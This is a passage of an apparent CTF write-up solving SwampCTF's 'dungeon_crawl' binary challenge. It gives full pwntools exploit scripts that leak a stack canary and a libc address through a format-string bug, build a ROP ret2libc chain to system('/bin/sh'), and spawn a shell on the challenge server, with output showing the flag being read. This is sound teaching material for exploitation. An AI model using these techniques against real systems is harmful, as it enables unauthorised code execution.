Best part of it all is that the value of the stack canaries in `<overflow_small>` and `<format_string>` comes from the same source `QWORD PTR fs:0x28`. We can use the value of the stack canary we read in `<format_string>` in our stack smashing exploit using function `<overflow_small>`.

Because the stack is not executable, we shall use the good old ROP to ret2libc. This is the pseudocode of what we will do to obtain a shell. 
```
1. Pop address of /bin/sh to rdi
2. Return to <system> in libc.
```

To obtain the real addresses of `'/bin/sh'` and `<system>`, we need to find their respective offsets in the shared library and the shared library's base address loaded into virtual memory.

```
from pwn import *
r = process('./level5')
elf = ELF('level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r.recvuntil('[3 format]: ')
r.sendline('3')

# To obtain the stack canary's value
r.recvuntil('The possibilities are endless!\n')
r.sendline('%71$lxA')
stack_can = int(r.recvuntil('A')[:-1], 16)
log.info('Stack canary : ' + hex(stack_can))

# To obtain the offset of the functions/ ROP gadgets in the shared library.
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
poprdi_ret_offset = libc.search(asm('pop rdi; ret', arch = 'amd64', os = 'linux')).next()

# To find the base address of the shared library loaded into the executable.
puts_got = elf.got['puts']
print "puts_got       =", hex(puts_got) 
puts_plt = elf.plt['puts']
r.recvuntil('[3 format]: ')
r.sendline('3')
r.recvuntil('The possibilities are endless!\n')     #The newline character is VERY important. If you do not include it, the puts_addr returned will be very different from the correct one.
r.sendline('%7$sAAAA' + p64(puts_got))
puts_addr = r.recvuntil('AAAA')[:-4]
for i in range(8 - len(puts_addr)):
	puts_addr += '\x00'
puts_addr = u64(puts_addr)
base_addr_libc = puts_addr - puts_offset
[...]
```
We use `puts` to get the base address of the shared library. This is because after `puts` was called once, its real address location was resolved by the resolver in the PLT, and sits in the GOT. Thus, we find the address of `puts`' GOT entry, and use the format string vulnerability to print out the value it points to. `%s` is the perfect choice as the argument given to it is the *pointer* to the string we want to print, and `puts`' GOT entry points to its real address.

Our exploit is merely a chain of the real addresses of `'/bin/sh'`, `<system>` and the ROP gadget `pop rdi; ret`.
```
[...]
binsh_addr = binsh_offset + base_addr_libc
system_addr = system_offset + base_addr_libc
poprdi_ret_addr = poprdi_ret_offset + base_addr_libc
print "puts_offset    =", hex(puts_offset)
print "puts_addr      =", hex(puts_addr) 
print "base_addr_libc =", hex(base_addr_libc) 
print "system_addr    =", hex(system_addr)
print "binsh_addr     =", hex(binsh_addr)

# Crafting the exploit
exploit = ""
exploit += "A" * 0x18
exploit += p64(stack_can)
exploit += "B" * 0x8
exploit += p64(poprdi_ret_addr)
exploit += p64(binsh_addr)
exploit += p64(system_addr)

r.recvuntil('[3 format]: ')
r.sendline('1')
r.recvuntil('extra challenge :)\n')
r.sendline(exploit)
r.interactive()
```

It works perfectly.
```
solomonbstoner@swjsUbuntu:~/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl$ python input\ level5.py 
[+] Starting local process './level5': pid 7438
[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Stack canary : 0x9e099b0c168d7300
puts_got       = 0x601210
puts_offset    = 0x6f690
puts_addr      = 0x7f4381112690
base_addr_libc = 0x7f43810a3000
system_addr    = 0x7f43810e8390
binsh_addr     = 0x7f438122fd57
[*] Switching to interactive mode
$ whoami
solomonbstoner
```

### Putting them all together
Now that we have managed to exploit all 5 levels individually, we need a Python script to exploit all of them in the Swampctf server.
```
from pwn import *

r = remote('chal1.swampctf.com', 1337)
libc = ELF('libc.so.6')

# Level 1

level1_exploit = '252534'
r.recvuntil('Access token please: ')
r.sendline(level1_exploit)
log.info('Passed Level 1.')

# Level 2

level2_exploit = '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xc9\x07\xcc\x00'
r.recvuntil('What is your party name? ')
r.sendline(level2_exploit)
log.info('Passed Level 2.')

# Level 3

level3_exploit = '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d'
r.recvuntil('what is your favorite spell? ')
r.sendline(level3_exploit)
log.info('Passed Level 3.')

# Level 4

ADDR_OF_GOAL = p32(0x804a47c)
level4_exploit = "\x61" * 108 + ADDR_OF_GOAL
r.recvuntil('action: ')
r.sendline('73')
r.recvuntil('your name? ')
r.sendline(level4_exploit)
log.info('Passed Level 4.')

# Level 5

elf = ELF('level5')

r.recvuntil('[3 format]: ')
r.sendline('3')
r.recvuntil('The possibilities are endless!\n')
r.sendline('%71$lxA')
stack_can = int(r.recvuntil('A')[:-1], 16)
log.info('Stack canary : ' + hex(stack_can))
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
poprdi_ret_offset = libc.search(asm('pop rdi; ret', arch = 'amd64', os = 'linux')).next()
puts_got = elf.got['puts']

puts_plt = elf.plt['puts']

r.recvuntil('[3 format]: ')
r.sendline('3')
r.recvuntil('The possibilities are endless!\n')
r.sendline('%7$sAAAA' + p64(puts_got))
puts_addr = r.recvuntil('AAAA')[:-4]
for i in range(8 - len(puts_addr)):
	puts_addr += '\x00'
puts_addr = u64(puts_addr)
base_addr_libc = puts_addr - puts_offset

binsh_addr = binsh_offset + base_addr_libc
system_addr = system_offset + base_addr_libc
poprdi_ret_addr = poprdi_ret_offset + base_addr_libc
log.info ("puts_got    		=" + hex(puts_got))
log.info ("puts_offset    	=" + hex(puts_offset))
log.info ("puts_addr    	=" + hex(puts_addr))
log.info ("base_addr_libc    	=" + hex(base_addr_libc))
log.info ("system_addr    	=" + hex(system_addr))
log.info ("binsh_addr    	=" + hex(binsh_addr))

exploit = ""
exploit += "A" * 0x18
exploit += p64(stack_can)
exploit += "B" * 0x8
exploit += p64(poprdi_ret_addr)
exploit += p64(binsh_addr)
exploit += p64(system_addr)
r.recvuntil('[3 format]: ')
r.sendline('1')
r.recvuntil('extra challenge :)\n')
r.sendline(exploit)
r.interactive()
```

And the challenge is solved! :)
```
$ python exploit.py 
[+] Opening connection to chal1.swampctf.com on port 1337: Done
[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Passed Level 1.
[*] Passed Level 2.
[*] Passed Level 3.
[*] Passed Level 4.
[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Stack canary : 0x36327c4ece0d200
[*] puts_got            =0x601210
[*] puts_offset        =0x6f690
[*] puts_addr        =0x7efe76835690
[*] base_addr_libc        =0x7efe767c6000
[*] system_addr        =0x7efe7680b390
[*] binsh_addr        =0x7efe76952d57
[*] Switching to interactive mode
$ whoami
ctf
$ ls
flag
level1
level2
level3
level4
level5
$ cat flag
flag{I_SurV1v3d_th3_f1n4l_b0ss}
```

END